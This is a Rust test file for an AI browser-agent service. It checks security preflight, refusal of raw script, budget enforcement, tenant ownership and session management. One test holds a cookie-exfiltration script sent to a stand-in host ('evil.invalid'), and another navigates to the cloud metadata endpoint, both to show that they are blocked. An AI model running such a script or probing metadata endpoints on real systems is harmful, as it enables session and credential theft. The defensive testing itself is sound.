use super::*;

#[tokio::test]
async fn agent_navigation_blocks_private_targets_at_edge_boundary() {
    let action = AgentAction::Navigate {
        url: "http://169.254.169.254/latest/meta-data".to_owned(),
    };
    let security = quarry_security::preflight::DefaultEngine::new();

    let error = validate_navigation(&action, &security)
        .await
        .expect_err("metadata endpoint must be blocked");

    assert_eq!(error.code, ErrorCode::SecurityBlocked);
}

#[test]
fn deny_raw_script_refuses_evaluate_only() {
    let evaluate = AgentAction::Evaluate {
        script: "document.title = 'x'".to_owned(),
    };
    assert!(deny_raw_script(&evaluate, "run_test").is_err());
    for allowed in [
        AgentAction::Click {
            selector: "#continue".to_owned(),
        },
        AgentAction::GetContent,
        AgentAction::Back,
    ] {
        deny_raw_script(&allowed, "run_test").expect("typed actions are not script");
    }
}

#[test]
fn deny_raw_script_error_is_typed_and_never_echoes_the_script() {
    let secret_script = "fetch('https://evil.invalid/?c='+document.cookie)";
    let error = deny_raw_script(
        &AgentAction::Evaluate {
            script: secret_script.to_owned(),
        },
        "run_test",
    )
    .expect_err("evaluate must be denied");
    assert_eq!(error.code, ErrorCode::Forbidden);
    assert!(!error.retryable);
    let details = error.details.clone().expect("typed details");
    assert_eq!(details["reason"], "raw_script_denied");
    assert_eq!(details["denied_action"], "evaluate");
    let rendered = serde_json::to_string(&error).unwrap();
    assert!(!rendered.contains("evil.invalid") && !rendered.contains("cookie"));
    // The REST status is 403 through the shared mapping.
    assert_eq!(error.code.http_status(), 403);
}

/// The REST entry point (`/step` and `/interact` share it) refuses raw
/// script before the approval, budget and receipt machinery, so a denial
/// consumes nothing.
#[tokio::test]
async fn step_refuses_raw_script_and_consumes_nothing() {
    let state = crate::test_support::test_state(Arc::new(
        quarry_runtime::fetch::StaticDriver::new(
            std::time::Duration::from_secs(5),
            "quarry-test",
        )
        .expect("static driver"),
    ));
    let claims = crate::test_support::claims_for_org("org");
    let run_id: RunKind = Id::new();
    let lease = BrowserLease {
        lease_id: Id::new(),
        profile_id: Id::new(),
        session_affinity_key: "test".into(),
        proxy_affinity: Default::default(),
        ttl_s: 60,
        capabilities: vec![],
        artifact_bucket: String::new(),
        persist_profile: false,
        viewport: None,
        org_id: "org".into(),
    };
    let entry = RunEntry {
        run_id: run_id.clone(),
        org_id: "org".into(),
        actor_id: claims.actor_id().to_string(),
        session: BrowserSession {
            lease: lease.clone(),
            inner: Arc::new(TokioMutex::new(SessionInner::default())),
        },
        ctx: ObservationContext {
            step: 0,
            current_url: String::new(),
            page_hash: String::new(),
            previous_screenshot: None,
            previous_observation: None,
            previous_network_keys: vec![],
            last_egress_sequence: 0,
            active_snapshot: None,
            observed_action_count: 0,
            challenge_observation_count: 0,
        },
        lease,
        constraints: AgentConstraints {
            max_steps: 5,
            allowed_domains: vec![],
            max_runtime_s: None,
            max_cost_usd: None,
        },
        zdr: ZdrMode::Off,
        grant_id: None,
        control_mode: BrowserControlMode::AgentControl,
        profile_scope: BrowserProfileScope::Ephemeral,
        execution_tier: BrowserExecutionTier::Chromium,
        last_observation: None,
        used_sensitive_approval_grants: HashSet::new(),
        budget: None,
    };
    let entry_arc = Arc::new(TokioMutex::new(entry));
    state
        .agent_runs
        .lock()
        .expect("agent_runs mutex")
        .insert(run_id.to_string(), entry_arc.clone());

    let result = step(
        State(state.clone()),
        Extension(claims),
        Path(run_id.to_string()),
        Json(StepBody {
            action: AgentAction::Evaluate {
                script: "document.title = 'pwned'".to_owned(),
            },
            instruction: None,
            extraction_profile: None,
        }),
    )
    .await;
    let (status, Json(envelope)) = result.err().expect("evaluate must be refused");
    assert_eq!(status, StatusCode::FORBIDDEN);
    let rendered = serde_json::to_value(&envelope).unwrap();
    assert_eq!(rendered["error"]["code"], "FORBIDDEN");
    assert_eq!(rendered["error"]["details"]["reason"], "raw_script_denied");
    assert!(
        !rendered.to_string().contains("pwned"),
        "the script is never echoed"
    );

    let entry = entry_arc.lock().await;
    assert_eq!(entry.ctx.step, 0, "a denial does not consume a step");
    assert!(entry.used_sensitive_approval_grants.is_empty());
}

#[tokio::test]
async fn non_navigation_actions_do_not_trigger_network_validation() {
    let action = AgentAction::Click {
        selector: "#continue".to_owned(),
    };
    let security = quarry_security::preflight::DefaultEngine::new();

    validate_navigation(&action, &security).await.unwrap();
}

#[test]
fn provider_meter_cost_is_copied_exactly_and_unknown_remains_unknown_in_telemetry() {
    let unknown = BrowserTelemetry::default();
    assert_eq!(unknown.verified_action_cost_micro_usd, None);
    assert_eq!(telemetry_receipt_cost_usd(&unknown), 0.0);

    let metered = BrowserTelemetry {
        verified_action_cost_micro_usd: Some(12_345),
        ..BrowserTelemetry::default()
    };
    assert!((telemetry_receipt_cost_usd(&metered) - 0.012_345).abs() < f64::EPSILON);
}

#[test]
fn zdr_forbids_persistent_profile_when_profile_id_supplied() {
    assert!(zdr_forbids_persistent_profile(ZdrMode::On, false, true));
}

#[test]
fn zdr_forbids_persistent_profile_when_flag_set_without_id() {
    assert!(zdr_forbids_persistent_profile(ZdrMode::On, true, false));
}

#[test]
fn zdr_forbids_persistent_profile_when_both_signals_present() {
    assert!(zdr_forbids_persistent_profile(ZdrMode::On, true, true));
}

#[test]
fn zdr_run_with_no_persistence_signal_is_allowed() {
    assert!(!zdr_forbids_persistent_profile(ZdrMode::On, false, false));
}

#[test]
fn non_zdr_run_may_request_a_persistent_profile() {
    assert!(!zdr_forbids_persistent_profile(ZdrMode::Off, true, true));
}

#[test]
fn browser_session_projection_requires_exact_tenant_and_actor() {
    let claims = crate::auth::Claims {
        sub: "user-owner".to_owned(),
        iss: "https://auth.example.test".to_owned(),
        exp: i64::MAX,
        org_id: "org-owner".to_owned(),
        user_id: "user-owner".to_owned(),
        principal_type: Some("user".to_owned()),
        service_id: None,
        nbf: None,
        aud: Some("quarry".to_owned()),
        scopes: Vec::new(),
        zdr: None,
    };

    assert!(caller_owns_browser_run("org-owner", "user-owner", &claims));
    assert!(!caller_owns_browser_run("org-owner", "user-other", &claims));
    assert!(!caller_owns_browser_run("org-other", "user-owner", &claims));
    assert!(!caller_owns_browser_run("org-owner", "", &claims));
}

#[test]
fn allowed_domains_accept_exact_and_subdomains_only() {
    let allowed = vec!["example.com".to_owned()];
    assert!(domain_allowed("https://example.com/path", &allowed));
    assert!(domain_allowed("https://docs.example.com/path", &allowed));
    assert!(!domain_allowed(
        "https://example.com.evil.test/path",
        &allowed
    ));
    assert!(!domain_allowed("https://other.test/path", &allowed));
}

#[test]
fn step_budget_is_fail_closed_once_limit_is_reached() {
    let mut entry = RunEntry {
        run_id: Id::new(),
        org_id: "org".into(),
        actor_id: "user".into(),
        session: BrowserSession {
            lease: BrowserLease {
                lease_id: Id::new(),
                profile_id: Id::new(),
                session_affinity_key: "test-session".into(),
                proxy_affinity: Default::default(),
                ttl_s: 60,
                capabilities: vec![],
                artifact_bucket: String::new(),
                persist_profile: false,
                viewport: None,
                org_id: "org".into(),
            },
            inner: Arc::new(TokioMutex::new(SessionInner::default())),
        },
        ctx: ObservationContext {
            step: 2,
            current_url: String::new(),
            page_hash: String::new(),
            previous_screenshot: None,
            previous_observation: None,
            previous_network_keys: vec![],
            last_egress_sequence: 0,
            active_snapshot: None,
            observed_action_count: 0,
            challenge_observation_count: 0,
        },
        lease: BrowserLease {
            lease_id: Id::new(),
            profile_id: Id::new(),
            session_affinity_key: "test".into(),
            proxy_affinity: Default::default(),
            ttl_s: 60,
            capabilities: vec![],
            artifact_bucket: String::new(),
            persist_profile: false,
            viewport: None,
            org_id: "org".into(),
        },
        constraints: AgentConstraints {
            max_steps: 2,
            allowed_domains: vec![],
            max_runtime_s: None,
            max_cost_usd: None,
        },
        zdr: ZdrMode::Off,
        grant_id: None,
        control_mode: BrowserControlMode::AgentControl,
        profile_scope: BrowserProfileScope::Ephemeral,
        execution_tier: BrowserExecutionTier::Chromium,
        last_observation: None,
        used_sensitive_approval_grants: HashSet::new(),
        budget: None,
    };
    assert!(enforce_step_budget(&entry).is_err());
    entry.constraints.max_steps = 0;
    assert!(enforce_step_budget(&entry).is_ok());
}

fn entry_with_budget(budget: Option<crate::budget::RunBudget>) -> RunEntry {
    let lease = BrowserLease {
        lease_id: Id::new(),
        profile_id: Id::new(),
        session_affinity_key: "test".into(),
        proxy_affinity: Default::default(),
        ttl_s: 60,
        capabilities: vec![],
        artifact_bucket: String::new(),
        persist_profile: false,
        viewport: None,
        org_id: "org".into(),
    };
    RunEntry {
        run_id: Id::new(),
        org_id: "org".into(),
        actor_id: "user".into(),
        session: BrowserSession {
            lease: lease.clone(),
            inner: Arc::new(TokioMutex::new(SessionInner::default())),
        },
        ctx: ObservationContext {
            step: 0,
            current_url: String::new(),
            page_hash: String::new(),
            previous_screenshot: None,
            previous_observation: None,
            previous_network_keys: vec![],
            last_egress_sequence: 0,
            active_snapshot: None,
            observed_action_count: 0,
            challenge_observation_count: 0,
        },
        lease,
        constraints: AgentConstraints {
            max_steps: 0,
            allowed_domains: vec![],
            max_runtime_s: None,
            max_cost_usd: None,
        },
        zdr: ZdrMode::Off,
        grant_id: None,
        control_mode: BrowserControlMode::AgentControl,
        profile_scope: BrowserProfileScope::Ephemeral,
        execution_tier: BrowserExecutionTier::Chromium,
        last_observation: None,
        used_sensitive_approval_grants: HashSet::new(),
        budget,
    }
}

fn agent_budget(max_steps: u32) -> crate::budget::RunBudget {
    crate::budget::RunBudget::start(
        &crate::budget::BudgetLimits::default(),
        crate::budget::RunClass::Agent,
        &AgentConstraints {
            max_steps,
            allowed_domains: vec![],
            max_runtime_s: None,
            max_cost_usd: None,
        },
        None,
        std::time::Instant::now(),
    )
}

#[test]
fn an_agent_run_is_refused_with_402_after_its_step_cap_in_on_mode() {
    use crate::budget::BudgetMode;
    let mut entry = entry_with_budget(Some(agent_budget(3)));
    let action = AgentAction::Click {
        selector: "#go".into(),
    };
    for _ in 0..3 {
        budget_gate_with(&mut entry, &action, BudgetMode::On).expect("within the cap");
        budget_charge(&mut entry, true, 0.0);
    }
    let error = budget_gate_with(&mut entry, &action, BudgetMode::On).unwrap_err();
    assert_eq!(error.code, ErrorCode::BudgetExhausted);
    assert_eq!(error.code.http_status(), 402);
    assert!(!error.retryable);
    assert_eq!(error.details.as_ref().unwrap()["dimension"], "steps");
    // It stays refused: calling again cannot refill it.
    assert!(budget_gate_with(&mut entry, &action, BudgetMode::On).is_err());
}

#[test]
fn a_failing_driver_hits_the_attempt_allowance_before_the_step_cap() {
    use crate::budget::BudgetMode;
    let mut entry = entry_with_budget(Some(agent_budget(5)));
    let action = AgentAction::Back;
    // 5 steps x factor 2 = 10 attempts; every one fails.
    for _ in 0..10 {
        budget_gate_with(&mut entry, &action, BudgetMode::On).expect("within attempts");
        budget_charge(&mut entry, false, estimated_action_cost_usd(&action));
    }
    let error = budget_gate_with(&mut entry, &action, BudgetMode::On).unwrap_err();
    assert_eq!(error.details.as_ref().unwrap()["dimension"], "attempts");
}

#[test]
fn a_human_session_is_never_budgeted_even_in_on_mode() {
    use crate::budget::{BudgetMode, RunBudget, RunClass};
    let human = RunBudget::start(
        &crate::budget::BudgetLimits::default(),
        RunClass::Interactive,
        &AgentConstraints {
            max_steps: 12,
            allowed_domains: vec![],
            max_runtime_s: Some(120),
            max_cost_usd: None,
        },
        None,
        std::time::Instant::now(),
    );
    let mut entry = entry_with_budget(Some(human));
    let action = AgentAction::Back;
    for _ in 0..40 {
        budget_gate_with(&mut entry, &action, BudgetMode::On)
            .expect("a person is not capped");
        budget_charge(&mut entry, true, 0.5);
    }
}

#[test]
fn shadow_and_off_modes_never_refuse_and_a_run_without_a_budget_is_untouched() {
    use crate::budget::BudgetMode;
    let action = AgentAction::Back;
    let mut entry = entry_with_budget(Some(agent_budget(1)));
    budget_charge(&mut entry, true, 0.0);
    assert!(budget_gate_with(&mut entry, &action, BudgetMode::Shadow).is_ok());
    assert!(budget_gate_with(&mut entry, &action, BudgetMode::Off).is_ok());
    let mut bare = entry_with_budget(None);
    assert!(budget_gate_with(&mut bare, &action, BudgetMode::On).is_ok());
    budget_charge(&mut bare, true, 1.0);
}

#[test]
fn a_budget_refusal_leaves_the_step_counter_and_approvals_alone() {
    use crate::budget::BudgetMode;
    let mut entry = entry_with_budget(Some(agent_budget(1)));
    budget_charge(&mut entry, true, 0.0);
    entry
        .used_sensitive_approval_grants
        .insert("grant_1".into());
    let before = (entry.ctx.step, entry.used_sensitive_approval_grants.clone());
    assert!(budget_gate_with(&mut entry, &AgentAction::Back, BudgetMode::On).is_err());
    assert_eq!(
        (entry.ctx.step, entry.used_sensitive_approval_grants.clone()),
        before
    );
}

async fn call_step(
    budget: Option<crate::budget::RunBudget>,
    action: AgentAction,
) -> (
    Result<(), (StatusCode, serde_json::Value)>,
    Arc<TokioMutex<RunEntry>>,
) {
    let state = crate::test_support::test_state(Arc::new(
        quarry_runtime::fetch::StaticDriver::new(
            std::time::Duration::from_secs(5),
            "quarry-test",
        )
        .expect("static driver"),
    ));
    let claims = crate::test_support::claims_for_org("org");
    let mut entry = entry_with_budget(budget);
    entry.actor_id = claims.actor_id().to_string();
    let run_id = entry.run_id.to_string();
    let entry_arc = Arc::new(TokioMutex::new(entry));
    state
        .agent_runs
        .lock()
        .expect("agent_runs mutex")
        .insert(run_id.clone(), entry_arc.clone());
    let result = step(
        State(state),
        Extension(claims),
        Path(run_id),
        Json(StepBody {
            action,
            instruction: None,
            extraction_profile: None,
        }),
    )
    .await;
    let mapped = result.map(|_| ()).map_err(|(status, Json(envelope))| {
        (status, serde_json::to_value(&envelope).unwrap())
    });
    (mapped, entry_arc)
}

fn respond_dialog() -> AgentAction {
    AgentAction::RespondDialog {
        dialog_id: "dlg_1".into(),
        accept: true,
        approval_grant_id: "grant_approval_1".into(),
        prompt_text: None,
    }
}

fn exhausted_budget() -> crate::budget::RunBudget {
    let mut budget = agent_budget(1);
    budget.charge(true, 0);
    budget
}

/// The budget refuses before a one-shot approval is looked at, let alone
/// consumed: with the run out of steps, an action that also needs an
/// approval gets the 402, not the approval's own error.
#[tokio::test]
async fn a_budget_refusal_comes_first_and_burns_no_single_use_approval() {
    let _pinned = crate::budget::test_mode::pin(crate::budget::BudgetMode::On);
    let (result, entry_arc) = call_step(Some(exhausted_budget()), respond_dialog()).await;
    let (status, body) = result.expect_err("the run is out of budget");
    assert_eq!(status, StatusCode::PAYMENT_REQUIRED);
    assert_eq!(body["error"]["code"], "BUDGET_EXHAUSTED");
    assert_eq!(body["error"]["retryable"], false);
    assert_eq!(body["error"]["details"]["dimension"], "steps");
    let entry = entry_arc.lock().await;
    assert!(entry.used_sensitive_approval_grants.is_empty());
    assert_eq!(entry.ctx.step, 0, "a refusal does not run the action");
}

#[tokio::test]
async fn shadow_mode_lets_the_same_step_reach_the_approval_check() {
    let _pinned = crate::budget::test_mode::pin(crate::budget::BudgetMode::Shadow);
    let (result, _entry) = call_step(Some(exhausted_budget()), respond_dialog()).await;
    let (status, body) =
        result.expect_err("no parent run grant, so the approval is refused");
    assert_eq!(status, StatusCode::FORBIDDEN, "{body}");
    assert_ne!(body["error"]["code"], "BUDGET_EXHAUSTED");
}

fn live_runs(count: usize) -> (AgentRuns, Vec<String>) {
    let runs: AgentRuns = Arc::default();
    let mut ids = Vec::new();
    for _ in 0..count {
        let entry = entry_with_budget(None);
        let id = entry.run_id.to_string();
        runs.lock()
            .unwrap()
            .insert(id.clone(), Arc::new(TokioMutex::new(entry)));
        ids.push(id);
    }
    (runs, ids)
}

fn test_driver() -> Arc<dyn quarry_browser::BrowserDriver> {
    Arc::new(quarry_browser::chromiumoxide::ChromiumoxideDriver::new())
}

#[tokio::test]
async fn a_drain_releases_every_live_session_and_empties_the_registry() {
    let (runs, _) = live_runs(5);
    let report = drain_runs(&runs, &test_driver(), std::time::Duration::from_secs(5)).await;
    assert_eq!(
        report,
        DrainReport {
            released: 5,
            failed: 0,
            in_use: 0
        }
    );
    assert!(
        runs.lock().unwrap().is_empty(),
        "nothing is left registered"
    );
}

#[tokio::test]
async fn a_run_a_request_still_holds_is_counted_not_released_and_does_not_block_the_rest() {
    let (runs, ids) = live_runs(3);
    let held = runs
        .lock()
        .unwrap()
        .get(&ids[1])
        .cloned()
        .expect("registered");
    let report = drain_runs(&runs, &test_driver(), std::time::Duration::from_secs(5)).await;
    assert_eq!(report.released, 2);
    assert_eq!(report.in_use, 1);
    assert!(runs.lock().unwrap().is_empty());
    drop(held);
}

#[tokio::test]
async fn draining_an_empty_registry_is_a_no_op() {
    let (runs, _) = live_runs(0);
    let report = drain_runs(&runs, &test_driver(), std::time::Duration::from_secs(1)).await;
    assert_eq!(report, DrainReport::default());
}

#[test]
fn the_checkpoint_carries_the_ledger_and_a_resume_restores_it() {
    use crate::budget::{BudgetMode, RunBudget};
    let mut entry = entry_with_budget(Some(agent_budget(2)));
    budget_charge(&mut entry, true, 0.001);
    budget_charge(&mut entry, true, 0.001);
    let checkpoint = checkpoint_for_entry(&entry);
    let saved = checkpoint
        .budget
        .clone()
        .expect("a budget in the checkpoint");
    assert_eq!(
        (saved.steps, saved.attempts, saved.spent_micro_usd),
        (2, 2, 2000)
    );
    assert_eq!(saved.class, "agent");
    // It survives the JSON the store writes.
    let stored: quarry_runtime::step_receipts::AgentRunCheckpoint =
        serde_json::from_value(serde_json::to_value(&checkpoint).unwrap()).unwrap();
    assert_eq!(stored.budget, checkpoint.budget);

    let resumed = RunBudget::start(
        &crate::budget::BudgetLimits::default(),
        crate::budget::RunClass::Agent,
        &AgentConstraints {
            max_steps: 2,
            allowed_domains: vec![],
            max_runtime_s: None,
            max_cost_usd: None,
        },
        stored.budget.as_ref(),
        std::time::Instant::now(),
    );
    let mut resumed_entry = entry_with_budget(Some(resumed));
    let error = budget_gate_with(&mut resumed_entry, &AgentAction::Back, BudgetMode::On)
        .unwrap_err();
    assert_eq!(error.details.as_ref().unwrap()["dimension"], "steps");
}

#[test]
fn an_old_checkpoint_without_a_budget_still_loads() {
    // What a checkpoint looked like before budgets: the same JSON without the field.
    let mut legacy =
        serde_json::to_value(checkpoint_for_entry(&entry_with_budget(None))).unwrap();
    legacy.as_object_mut().unwrap().remove("budget");
    let checkpoint: quarry_runtime::step_receipts::AgentRunCheckpoint =
        serde_json::from_value(legacy).expect("a pre-budget checkpoint loads");
    assert!(checkpoint.budget.is_none());
}

#[test]
fn every_path_prices_a_completed_action_from_the_flat_table_when_the_driver_gave_none() {
    let action = AgentAction::Click {
        selector: "#go".into(),
    };
    let unmetered = BrowserTelemetry::default();
    let flat = estimated_action_cost_usd(&action);
    assert!(flat > 0.0, "the flat table prices a click");
    assert_eq!(receipt_cost_usd(&unmetered, &action), flat);
    let metered = BrowserTelemetry {
        verified_action_cost_micro_usd: Some(7),
        ..BrowserTelemetry::default()
    };
    assert!((receipt_cost_usd(&metered, &action) - 0.000_007).abs() < 1e-12);
}

#[test]
fn normalize_viewport_accepts_reasonable_desktop_size() {
    let viewport = normalize_viewport(Some(BrowserViewport {
        width: 1280,
        height: 800,
        device_scale_factor: 0.0,
        is_mobile: false,
    }))
    .expect("valid viewport")
    .expect("viewport");

    assert_eq!(viewport.width, 1280);
    assert_eq!(viewport.height, 800);
    assert_eq!(viewport.device_scale_factor, 1.0);
    assert!(!viewport.is_mobile);
}

#[test]
fn normalize_viewport_rejects_unbounded_sizes() {
    let err = normalize_viewport(Some(BrowserViewport {
        width: 10_000,
        height: 800,
        device_scale_factor: 1.0,
        is_mobile: false,
    }))
    .expect_err("oversized viewport should be rejected");

    assert!(err.contains("viewport"));
}

#[test]
fn frame_stream_query_accepts_url_encoded_numbers() {
    let uri: axum::http::Uri =
        "/frames/ws?format=jpeg&quality=55&maxWidth=640&maxHeight=480&everyNthFrame=2&timeoutMs=750&intervalMs=150&maxFrames=8"
            .parse()
            .expect("valid uri");
    let Query(query) = Query::<FrameStreamQuery>::try_from_uri(&uri)
        .expect("browser query numbers should parse");

    assert_eq!(query.frame.format.as_deref(), Some("jpeg"));
    assert_eq!(query.frame.quality, Some(55));
    assert_eq!(query.frame.max_width, Some(640));
    assert_eq!(query.frame.max_height, Some(480));
    assert_eq!(query.frame.every_nth_frame, Some(2));
    assert_eq!(query.frame.timeout_ms, Some(750));
    assert_eq!(query.interval_ms, Some(150));
    assert_eq!(query.max_frames, Some(8));
}

#[test]
fn live_frame_options_clamp_stream_parameters() {
    let options = live_frame_options(
        &FrameQuery {
            format: Some("jpeg".to_owned()),
            quality: Some(0),
            max_width: Some(99_999),
            max_height: Some(10),
            every_nth_frame: Some(0),
            timeout_ms: Some(99_999),
        },
        BrowserViewport {
            width: 1280,
            height: 800,
            device_scale_factor: 1.0,
            is_mobile: false,
        },
    )
    .expect("valid frame options");

    assert_eq!(options.quality, 1);
    assert_eq!(options.max_width, 1280);
    assert_eq!(options.max_height, 240);
    assert_eq!(options.every_nth_frame, 1);
    assert_eq!(options.timeout_ms, 5_000);
}

#[test]
fn browser_ws_client_message_parses_action() {
    let message: BrowserWsClientMessage = serde_json::from_value(serde_json::json!({
        "type": "action",
        "action": { "type": "click_point", "x": 12.5, "y": 30.0 },
        "instruction": "human takeover click"
    }))
    .expect("valid websocket action");

    match message {
        BrowserWsClientMessage::Action {
            action: AgentAction::ClickPoint { x, y },
            instruction,
        } => {
            assert_eq!(x, 12.5);
            assert_eq!(y, 30.0);
            assert_eq!(instruction.as_deref(), Some("human takeover click"));
        }
        other => panic!("unexpected message: {other:?}"),
    }
}
